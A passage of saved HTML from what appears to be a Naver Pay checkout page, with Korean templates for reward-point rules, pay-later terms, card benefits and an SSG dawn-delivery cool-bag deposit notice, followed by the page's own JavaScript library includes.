											<span class="checkbox checkbox-applied _click(nmp.front.order.order_sheet.checkAllAgreed())" id="mallProvisionAgree">
												<span class="checkbox-mark"></span>
												<input type="checkbox" name="isAgreeMallContract" id="mall_provision_agree" class="_certificationForm _agreeBtn" checked="">
											</span>
											<label for="mall_provision_agree">쇼핑몰 구매 약관 동의 <a href="#" class="btn_bu _click(nmp.front.order.order_sheet.openMallProvision(true)) _stopDefault" title="쇼핑몰 구매약관">상세보기<span class="ico_more2"></span></a></label>
										</div>
									</div>
								</div>
							</div>
						<div class="area_notice">
							<p class="notice">결제를 완료하였습니다</p>
						</div>
					</div>
						</div>
						
					</div>
							
							
						</div>
					<input type="hidden" name="_callback" value="nmp.front.order.order_sheet.refreshPage"></form>
					
					
					
					
					
					
					
					
					
					
					
					
							
					
							
					
							
							
							
							
					
							
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					</div>
					
					
					
					
					
					
					
					
					
					
					
					<script type="text/template" class="_tpl_layer_easypay_mileage">
						<dt>구매 적립 혜택</dt>
						<dd>
							<ul class="info_txt ly_cont_npay_list">
								<li>상품별 주문금액기준 구매확정 시 즉시 적립됩니다.</li>
								<li>쿠폰할인금액/배송비/추가구성상품가격/SSG새벽배송 알비백 보증금은 제외되며 1회 주문 기준 최대 10만원까지만 적립됩니다. (단, 무통장입금은 최대 2만원까지 적립)</li>
								<li>충전포인트/네이버통장 결제적립은 충전포인트 사용금액에서 SSG새벽배송 알비백 보증금을 차감한 금액 기준으로 적립됩니다. (복합결제 시, 간편/일반결제&gt;후불결제&gt;충전포인트 순서로 보증금 금액 차감하여 계산)</li>
								<li>간편결제/일반결제에 따라 지급되는 적립혜택이 상이할 수 있습니다.</li>
								<li>상품주문결제 금액에서 구매 적립과 리뷰 적립 포인트를 차감한 금액이 0원 미만 (마이너스 금액)일 경우 구매 적립과 리뷰 작성에 대한 포인트 적립이 제외됩니다.</li>
								<li>예약/주문 시 노출되는 적립 금액은 적립 예상 금액으로 프로모션 내용에 따라 실제 적립되는 금액과 차이가 있을 수 있습니다.<br>(프로모션 상세 조건에 따라 적립)</li>
								<li>예약은 이용완료 후 적립됩니다.</li>
								<li>네이버주문은 음식 서빙 및 픽업이 완료된 이후 적립됩니다.</li>
								<li><b>원쁠딜 공유 추가적립은 동일 상품에 대해 1회로 제한됩니다.</b></li>
							</ul>
							<table cellspacing="0" border="1" style="width:345px">
							<caption>포인트 적립혜택</caption>
							<colgroup><col><col width="38%">
							</colgroup><thead class="blind">
							<tr>
							<th scope="col">상품명</th>
							<th scope="col">구매평갯수</th>
							</tr>
							</thead>
							<tbody>
							{for index:item in items}
								<tr {if index == 0}class="first"{/if}>
								<td>{=item.productName}</td>
								{set commaMileage=nmp.utility.convertNumberFormat(=item.mileage)}
								<td class="bg_point"><strong>{=commaMileage}</strong>원</td>
								</tr>
							{/for}
							</tbody>
							</table>
							<a href="http://event2.pay.naver.com/event/benefit/list#ORDER_BENEFIT" target="_blank" class="btn_more">자세히보기</a>
						</dd>
					</script>
					
					<script type="text/template" class="_layer_card_benefit">
						<div class="dimmed _cardBenefitContentsDimmed"></div>
						<div class="ly_wrap type_tooltip _cardBenefitContents" style="margin-left:-193px;">
							<div class="ly_container type_nopayment">
								<strong class="ly_tit">혜택카드 적립</strong>
								<ul class="list_dot">
									<li class="item_dot">· 동일주문 내 모든 상품의 상태가 종료되면 구매확정 상품에 한해, 혜택카드 결제금액에 대한 혜택이 잔여한도 내에서 적립됩니다.</li>
									<li class="item_dot">· 혜택카드 잔여한도는 전체한도에서 확정 및 예정 혜택을 제외한 금액입니다.</li>
									<li class="item_dot">· 혜택 한도 소진 후 기존 주문에 대한 취소/환불 등의 사유로 한도 복구가 되더라도, 한도 소진 상태에서의 주문들에 대해서는 혜택이 소급적용 되지 않습니다.</li>
								</ul>
								<div class="area_reward">
									<div class="image">
										<img src={=cardImageUrl} width="40" height="26" alt={=cardName}>
									</div>
									<strong class="target">{=cardName}</strong>
									<span class="reward">
									<span class="cell">
										<span class="area_ellipsis">
											<span class="ellipsis">이벤트기간 내 잔여한도</span>
										</span>
									</span>
									<span class="cell">
										{set remainedCardBenefit=nmp.utility.convertNumberFormat(=remainedCardBenefitAmount)}
										<em class="point">{=remainedCardBenefit}<span class="text">원</span></em>
									</span>
								</span>
								</div>
							</div>
							<a href="#" class="clse _click(nmp.front.order.order_sheet.hideLayerCardBenefit()) _stopDefault"><span class="blind">닫기</span></a>
						</div>
					</script>
					
					
					
					<script type="text/template" class="_tpl_layer_review_mileage">
						<h5 class="layer_title">리뷰 적립 혜택</h5>
						<div class="layer_content">
							<p class="desc_guide">•텍스트 리뷰와 포토/동영상 리뷰 적립 혜택은 중복으로 지급되지 않으며, 포토/동영상 리뷰 작성 포인트는 최초 작성 시 포토/동영상을 첨부할 경우에만 적립됩니다.</p>
							{set afterUseReviewExists = "N"}
							{for index:item in items}
								{if (item.textReviewMileage.AFTER_USE > 0) || (item.photoVideoReviewMileage.AFTER_USE > 0)}
									{set afterUseReviewExists = "Y"}
								{/if}
							{/for}
							{if afterUseReviewExists == "Y"}
								<p class="desc_guide">•한달사용 리뷰 작성 추가 포인트는 구매확정 이후 30일까지 리뷰를 작성하고, 한달사용 리뷰를 추가로 작성할 때만 지급됩니다.</p>
							{/if}
							<p class="desc_guide">•동일 상품(상품번호 기준)에 대한 리뷰 적립 혜택은 리뷰/한달사용 리뷰 각각 1회로 제한되며, 적립 후 30일 경과 시 리뷰 적립혜택을 다시 받을 수 있습니다.</p>
							<p class="desc_guide">•상품 결제금액 기준 3,000원 미만인 경우 리뷰 작성에 대한 포인트 적립이 제외됩니다.</p>
							<p class="desc_guide">•상품주문결제 금액에서 구매 적립과 리뷰 적립 포인트를 차감한 금액이 0원 미만(마이너스 금액)일 경우 구매 적립과 리뷰 작성에 대한 포인트 적립이 제외됩니다.</p>
							<div class="benefit_table">
								<table class="layer_table">
									<colgroup>
										<col>
										<col width="219">
									</colgroup>
									<thead class="blind">
									<tr>
										<th scope="col">상품명</th>
										<th scope="col">적립혜택</th>
									</tr>
									</thead>
									<tbody>
									{for index:item in items}
									<tr>
										<td>{=item.productName}</td>
										<td class="benefit">
											<div class="point_list">
												{set commaNormalTextReviewMileage=nmp.utility.convertNumberFormat(=item.textReviewMileage.NORMAL)}
												{set commaNormalPhotoVideoReviewMileage=nmp.utility.convertNumberFormat(=item.photoVideoReviewMileage.NORMAL)}
												{set commaAfterUseTextReviewMileage=nmp.utility.convertNumberFormat(=item.textReviewMileage.AFTER_USE)}
												{set commaAfterUsePhotoVideoReviewMileage=nmp.utility.convertNumberFormat(=item.photoVideoReviewMileage.AFTER_USE)}
												{set commaSubscriberReviewMileage=nmp.utility.convertNumberFormat(=item.subscriberReviewMileage)}
												{if (item.textReviewMileage.NORMAL > 0 || item.photoVideoReviewMileage.NORMAL > 0)}
													<strong class="tit">리뷰 작성 시 포인트 안내</strong>
												{/if}
												{if item.textReviewMileage.NORMAL > 0}
													<span class="detail">텍스트 리뷰 <b class="pointcolor_npay">{=commaNormalTextReviewMileage}원</b></span>
												{/if}
												{if item.photoVideoReviewMileage.NORMAL > 0}
													<span class="detail">포토/동영상 리뷰 <b class="pointcolor_npay">{=commaNormalPhotoVideoReviewMileage}원</b></span>
												{/if}
												{if (item.textReviewMileage.AFTER_USE > 0 || item.photoVideoReviewMileage.AFTER_USE > 0)}
													<strong class="tit">한달사용 리뷰 작성 시 추가 포인트 안내</strong>
												{/if}
												{if item.textReviewMileage.AFTER_USE > 0}
													<span class="detail">텍스트 리뷰 <b class="pointcolor_npay">{=commaAfterUseTextReviewMileage}원</b></span>
												{/if}
												{if item.photoVideoReviewMileage.AFTER_USE > 0}
													<span class="detail">포토/동영상 리뷰 <b class="pointcolor_npay">{=commaAfterUsePhotoVideoReviewMileage}원</b></span>
												{/if}
												{if item.subscriberReviewMileage > 0}
													<span class="detail talktalk">톡톡친구/스토어찜 고객 포인트<br> 추가 지급 <b class="pointcolor_npay">{=commaSubscriberReviewMileage}원</b></span>
												{/if}
											</div>
										</td>
									</tr>
									{/for}
									</tbody>
								</table>
							</div>
						</div>
						<button class="layer_close _click(nmp.layer.hide()) _stopDefault"><span class="blind">팝업 닫기</span></button>
					</script>
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					<script type="text/template" class="_tpl_layer_payNextGuide">
						{set skipPaymentDueDate = "2"}
						{if isEasyBooking == 'true'}
							{set skipPaymentDueDate = "1"}
						{/if}
						<dt>나중에 결제란?</dt>
						<dd>무통장입금과 같이 지금 결제하지 않고 주문 완료 후 {=skipPaymentDueDate}영업일 내에 결제할 수 있는 결제 수단입니다.
							<ul class="bullet">
								<li>결제수단 : 계좌 간편결제, 카드 간편결제</li>
							</ul>
							(상품에 따라 이용 가능한 결제 수단이 다를 수 있으니 주문 시 확인해주세요)
						</dd>
						<dd>
							<ul class="bullet">
								<li>결제가 완료되어야
									{if isEasyBooking == 'true'}
										예약이 진행되며 1일 내에 결제되지 않으면, 예약이 취소됩니다.
									{else}
										배송이 진행되며 2영업일 이내 결제되지 않으면 주문이 취소됩니다.
									{/if}
								</li>
								<li>‘나중에 결제’ 수단을 선택하실 경우 주문 후 {=skipPaymentDueDate}영업일 이내 <a href="http://order.pay.naver.com/home" class="pointcol5" target="_blank">결제 내역에서 결제</a>해주세요.</li>
							</ul>
						</dd>
						<dd>무통장입금을 원하시는 경우 ‘나중에 무통장 입금’ 결제 수단으로 주문해주세요.</dd>
					</script>
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					<script type="text/template" class="_tpl_layer_blackconsumer">
						<div class="dimmed"></div>
						<div class="ly_wrap _blackconsumerNotice" style="margin-left:-193px;">
							<div class="ly_container error_v2">
								<strong class="ly_tit">구매불가 상품 안내</strong>
								{if customerCenterTelNo != null}
									<p class="ly_desc">회원님은 해당 판매자의 상품 구매가 불가 합니다.<br>자세한 사항은 판매자에게 문의하여 주시기 바랍니다.<br><em class="point_txt">{=merchantName}({=customerCenterTelNo})</em></p>
								{else}
									<p class="ly_desc">회원님은 해당 판매자의 상품 구매가 불가 합니다.<br>자세한 사항은 상품 Q&A를 통해<br>판매자에게 문의하여 주시기 바랍니다.<br></p>
								{/if}
								<a href="#" class="btn_prev _click(nmp.front.order.order_sheet.hideNotice(_blackconsumerNotice)) _stopDefault">확인</a>
							</div>
						</div>
					</script>
					
					<script type="text/template" class="_tpl_layer_point_charge">
						<a href="{=detailLink}" class="charge_notice _pointChargeArea">{=message}<span class="ico_more"></span></a><!--N=a:ode.pointchc-->
					</script>
					
					<script type="text/template" class="_tpl_layer_hopeDeliveryFee">
						<dl>
							<dt>희망일배송 지역별 배송비</dt>
							<dd>
								{for index:text in hopeDeliveryFeeTexts}
									{=text}<br />
								{/for}
								<br />
								추가 비용은 착불 등을 통해 별도
								<br />
								지불 (판매자 확인 가능)
							</dd>
						</dl>
					</script>
					
					<script type="text/template" class="_tpl_easy_pay_card_info">
						<span class="type">{=sCardType}</span>
						<div class="card_name">
							<span class="card_no"><span class="blind">카드 뒤 4자리</span>({=sCardNo})</span>
							<p class="name"><span class="blind">카드명</span>{=sCardName}</p>
						</div>
					</script>
					
					<script type="text/template" class="_tpl_easy_pay_bank_panel">
						<li class="flick-ct flick-ct-dmm _flickPanel" style="transition-property: -webkit-transform; transition-duration: 0ms; transform: translate(0px, 0px); float: left; {if !oRegisteredEasyPayBank.isPayable} width: 5.26316%; {else} width: 6.66666666666667%;{/if} left: 0%; z-index: 10;">
							<div class="flick-wrap">
								{if oRegisteredEasyPayBank.payPartnershipItemCode != null && oRegisteredEasyPayBank.payPartnershipItemCode != ""}
								{set easyPayBankClass = (=oRegisteredEasyPayBank.payPartnershipItemCode)}
								{else}
								{set easyPayBankClass = 'bank_' + (=oRegisteredEasyPayBank.bankCode)}
								{/if}
								<div class="simplepay_select _easyPayMethod _easyPayMethodSelect {=easyPayBankClass}">
									{if oRegisteredEasyPayBank.isPayable}
									<span class="sp_simplepay button_checked"></span>
									{/if}
					
									{if oRegisteredEasyPayBank.nickName != null && oRegisteredEasyPayBank.nickName != ""}
									{set easyPayAccountName = (=oRegisteredEasyPayBank.nickName)}
									{elseif oRegisteredEasyPayBank.payPartnershipItemName != null && oRegisteredEasyPayBank.payPartnershipItemName != ""}
									{set easyPayAccountName = (=oRegisteredEasyPayBank.payPartnershipItemName)}
									{else}
									{set easyPayAccountName = '계좌번호'}
									{/if}
					
									<div name="payMeansClass" data-code="{=oRegisteredEasyPayBank.bankCode}" data-account-key="{=oRegisteredEasyPayBank.accountKey}" class="card_select bank sp_bank _payMeansClass {if !oRegisteredEasyPayBank.isPayable}disabled{/if}">
										<span class="blind">{=oRegisteredEasyPayBank.bankCode}</span>
										{if oRegisteredEasyPayBank.isPayable}
										<strong class="account_name noname">{=easyPayAccountName}</strong>
										<p class="card_number">{=oRegisteredEasyPayBank.maskedAccountNo}</p>
										{else}
										<span class="checking">점검중</span>
										<p class="disable_text">은행 시스템 점검으로 인해 해당 계좌로<br>간편결제를 이용하실 수 없습니다.</p>
										{/if}
									</div>
								</div>
							</div>
						</li>
					</script>
					
					<script type="text/template" class="_tpl_purchase_benefit">
						{set commaTotal=nmp.utility.convertNumberFormat(=TOTAL)}
						<div class="benefit_summary">
							<strong class="saving_title">구매적립<a href="#" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerMileage(normal)) _stopDefault" title="?">도움말</a><!--N=a:ord.buybenefit--></strong>
							<em class="summary_num">총 <span>{=commaTotal}</span>원</em>
						</div>
						<ul class="inner_list">
							{set commaTotalPurchaseMileage=nmp.utility.convertNumberFormat(=TOTAL_PURCHASE)}
							{set commaTotalAdditionalMileage=nmp.utility.convertNumberFormat(=TOTAL_ADDITIONAL)}
							{set commaMembershipPoint=nmp.utility.convertNumberFormat(=TOTAL_MEMBERSHIP)}
							{set commaTotalChargedPoint=nmp.utility.convertNumberFormat(=TOTAL_CHARGED_POINT)}
							{set commaTotalChargedPointAdditional=nmp.utility.convertNumberFormat(=TOTAL_CHARGED_POINT_ADDITIONAL)}
							{set commaTotalAdminAdditionalPoint=nmp.utility.convertNumberFormat(=TOTAL_ADMIN_ADDITIONAL)}
					
							{if (TOTAL_PURCHASE > 0)}
							<li>
								<span class="benefit_name">기본적립</span>
								<span class="benefit_sum"><b>{=commaTotalPurchaseMileage}</b>원</span>
							</li>
							{/if}
							{if (TOTAL_ADMIN_ADDITIONAL > 0)}
							<li>
									<span class="benefit_name">상품구매 추가적립</span>
								<span class="benefit_sum"><b>{=commaTotalAdminAdditionalPoint}</b>원</span>
							</li>
							{/if}
							{if (TOTAL_SCM > 0)}
							{for item in items}
								{set commaSellerCustomerManagementMileage=nmp.utility.convertNumberFormat(=item.amount)}
								<li>
									<span class="benefit_name">{=item.key}</span>
									<span class="benefit_sum"><b>{=commaSellerCustomerManagementMileage}</b>원</span>
								</li>
							{/for}
							{/if}
							{if (TOTAL_ADDITIONAL > 0)}
							<li>
								<span class="benefit_name">파워적립</span>
								<span class="benefit_sum"><b>{=commaTotalAdditionalMileage}</b>원</span>
							</li>
							{/if}
							{if (TOTAL_INFLOW > 0)}
								{for inflowBenefit in inflowBenefits}
									{set commaInflowBenefitMileage=nmp.utility.convertNumberFormat(=inflowBenefit.mileage.amount)}
										{if !inflowBenefit.mileage.membershipImageYn}
											<li>
												<span class="benefit_name">{=inflowBenefit.key}</span>
												<span class="benefit_sum"><b>{=commaInflowBenefitMileage}</b>원</span>
											</li>
										{/if}
								{/for}
							{/if}
							{if (TOTAL_INFLOW > 0)}
								{for inflowBenefit in inflowBenefits}
									{set commaInflowBenefitMileage=nmp.utility.convertNumberFormat(=inflowBenefit.mileage.amount)}
									{if inflowBenefit.mileage.membershipImageYn}
										<li>
											<span class="benefit_name">{=inflowBenefit.key} <span class="ico_npmember type_abbr"><span class="blind">네이버플러스 멤버십</span></span></span>
											<span class="benefit_sum"><b>{=commaInflowBenefitMileage}</b>원</span>
										</li>
									{/if}
								{/for}
							{/if}
							{if (TOTAL_CHARGED_POINT > 0)}
							<li>
								<span class="benefit_name">충전포인트 결제적립</span>
								<span class="benefit_sum"><b>{=commaTotalChargedPoint}</b>원</span>
							</li>
							{/if}
							{if (TOTAL_CHARGED_POINT_ADDITIONAL > 0)}
							<li>
								<span class="benefit_name">네이버통장 추가적립</span>
								<span class="benefit_sum"><b>{=commaTotalChargedPointAdditional}</b>원</span>
							</li>
							{/if}
							{if (TOTAL_MEMBERSHIP > 0)}
							<li class="membership_item">
								<span class="benefit_name">멤버십 추가적립 <span class="ico_npmember type_abbr"><span class="blind">네이버플러스 멤버십</span></span>
									
								</span>
								<span class="benefit_sum"><b>{=commaMembershipPoint}</b>원</span>
							</li>
							{/if}
						</ul>
					</script>
					
					<script type="text/template" class="_tpl_card_benefit">
						{if (commaCardBenefitPoint > 0)}
						{set cardBenefitPoint=nmp.utility.convertNumberFormat(=commaCardBenefitPoint)}
						<div class="benefit_summary">
							<strong class="saving_title">혜택카드적립<a href="#" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerCardBenefit()) _stopDefault" title="?">도움말</a></strong>
							<em class="summary_num">최대 <span>{=cardBenefitPoint}</span>원</em>
						</div>
						{/if}
					</script>
					
					
					<script type="text/template" class="_tpl_review_benefit">
						{if (TOTAL > 0)}
							{set commaMaxReviewMilease=nmp.utility.convertNumberFormat(=MAX_REVIEW_MILEASE)}
							<div class="benefit_summary">
								<strong class="saving_title">리뷰적립<a href="#" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerReviewMileage()) _stopDefault" title="?">도움말</a><!--N=a:ord.reviewbenefit--></strong>
								<em class="summary_num">최대 <span>{=commaMaxReviewMilease}</span>원</em>
							</div>
						{/if}
					</script>
					
					<script type="text/template" class="_tpl_review_benefit_guide_c1">
						<div class="desc_text">
							<p>동일 상품의 상품리뷰 적립은 1회로 제한됩니다.</p>
						</div>
					</script>
					
					<script type="text/template" class="_tpl_review_benefit_guide_c2">
						<div class="desc_text">
							<p>동일 상품의 상품리뷰/한달사용리뷰 적립은 각각 1회로 제한됩니다.</p>
						</div>
					</script>
					
					<script type="text/template" class="_tpl_register_account_benefit">
						{set commaBankEventMileage=nmp.utility.convertNumberFormat(=BANK_EVENT)}
						<strong class="saving_title">등록적립<a href="#" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerPayEvent(ACCOUNT,REGISTER,{=BANK_EVENT})) _stopDefault" title="?">도움말</a></strong>
						<ul class="inner_list">
							<li>
								<span class="benefit_name">첫 계좌 등록 시</span>
								<span class="benefit_sum"><b>{=commaBankEventMileage}</b>원</span>
							</li>
						</ul>
					</script>
					
					
					
					
					<script type="text/template" class="_tpl_layer_payEvent">
						<dt><span class="sp_npay">네이버 페이</span> 간편결제 {=payMethod} 첫 {=action} 혜택</dt>
						<dd>
							<p class="info_txt">네이버페이 <strong>간편결제 {=payMethod} 첫 {=action}</strong>시 현금처럼 사용가능한 네이버페이 포인트 <strong>{=amount}원</strong>을 즉시 지급 해드립니다.</p>
							<p class="info_txt">{=action}완료 이후 네이버페이포인트 지급내역 바로 확인하실 수 있습니다.</p>
							<a href="http://event2.pay.naver.com/event/benefit/list{if action == '등록'}#FIRST_REGISTER{else}#FIRST_USE{/if}" class="btn_more" target="_blank">자세히보기</a>
						</dd>
					</script>
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					
					</div>
					
					<div class="_dimmedLayerSimplePayMethodAutoChoice" style="display:none">
						<div class="dimmed"></div>
						<div class="ly_wrap _simplePayMethodAutoChoice" style="margin-left:-240px;">
							<div class="ly_container type_nopayment">
								<strong class="ly_nopayment_sub_title">남은 결제금액이 있어<br>결제수단이 추가 선택됩니다.</strong>
								<a href="#" class="btn_prev _click(nmp.front.order.order_sheet.hideDimmedLayerSimplePayMethodAutoChoice()) _stopDefault">확인</a>
							</div>
						</div>
					</div>
					
					<div class="ly_type2 _layer_refund_account_guide" style="left: -30px; width: 320px; margin-top: 3px;margin-left: -16px; display:none">
						<p class="information">
							환불계좌 출금 정책 변경으로 인해<br><em class="enhanced">신규 환불계좌 선택이 필요합니다.</em>
						</p>
						<a href="#" class="clse _click(nmp.layer.hide()) _stopDefault clse _clse_tab"><span class="blind">닫기</span></a>
					</div>
					
					<div class="ly_type2 _coolBagDepositTooltip" style="display: none; width:320px">
						<dl class="ly_cont14">
							<dt>알비백 보증금 안내</dt>
							<dd>알비백은 SSG 새벽배송에 사용되는 보냉 가방으로 새벽배송 시 신선도 유지를 위해 주문하신 상품을 배송기사님께서 알비백에 담아드립니다.</dd>
							<dd>
								<ul>
									<li>
										네이버 장보기의 SSG 새벽배송 ‘첫 주문’ 은 알비백을 무료로 지급해 드립니다. <span class="text_small">(네이버ID 기준)</span>
										<ul class="sub_list">
											<li><em class="point">· 다음 새벽배송 주문부터 지급받은 알비백을 문 앞에 꼭 놓아 주세요.</em></li>
										</ul>
									</li>
									<li>
										두번째 주문부터 ‘알비백 보증금’ 3,000원이 함께 결제됩니다.
										<ul class="sub_list">
											<li>· 보증금은 회수용 알비백이 지급될 경우를 대비해 미리 결제해두는 금액입니다.</li>
											<li><em class="point">· 알비백을 문 앞에 두셨다면 보증금은 배송완료 시 결제하신 수단으로 환불해 드립니다.</em></li>
											<li>· 문 앞에 알비백이 없다면 신선한 배송을 위해 회수용 알비백에 담아 드립니다.
					
											</li>
										</ul>
									</li>
									<li>
										보유하신 회수용 알비백은 꼭 반납해 주세요!
										<ul class="sub_list">
											<li>· 다음 새벽배송 주문 시 회수용 알비백을 함께 문 앞에 두면, <em class="point">배송기사님이 회수 후 네이버페이 충전포인트로 돌려 드립니다.</em></li>
											<li>· 회수용 알비백을 2개 이상 보유 시 다음 주문에 결제되는 보증금이 인상됩니다.</li>
										</ul>
									</li>
								</ul>
							</dd>
						</dl>
						<a href="#" class="clse _click(nmp.front.order.order_sheet.toggleDepositTooltip(coolBagDeposit)) _stopDefault"><span class="blind">닫기</span></a>
					</div>
					
					<a href="#" target="naverPayAuth" style="display:none;" class="_naverPayAuthPopup _click(nmp.front.order.order_sheet.openNaverPayAuthPopup())"></a>              </div>
							<!-- //content -->
						
						<!-- //container -->   
					
						<!-- footer -->
						<!-- footer -->
							
						<!-- //footer -->
						
						<!-- //footer --> 
						
						
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/jindo.all.js?ts=1&amp;1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/nmp.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/nmp.base.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/nmp.variables.js?ts=1&amp;1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/nmp.utility.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/nmp/nmp.layer.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/nmp.event_delegator.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/nmp.message.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/nmp/nmp.window.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/DateCoreAPI_Lite.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Component.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.UIComponent.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.HTMLComponent.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Timer.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.WatchInput.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.DefaultTextValue.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.LayerManager.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.LayerPosition.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Effect.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.LayerEffect.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Transition.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Calendar.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.DatePicker.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.PeriodDisplay.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.DateRangePicker.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.WeekPicker.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.MonthPicker.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.MultiDatePicker.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Pagination.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.TabControl.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.LazyLoading.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.RolloverArea.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.RolloverClick.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.SelectBox.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Rolling.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.CircularRolling.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.NumericStepper.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.FileUploader.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.Base.js?1646914882576" charset="utf-8"></script>
					<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.Grid.js?1646914882576" charset="utf-8"></script>
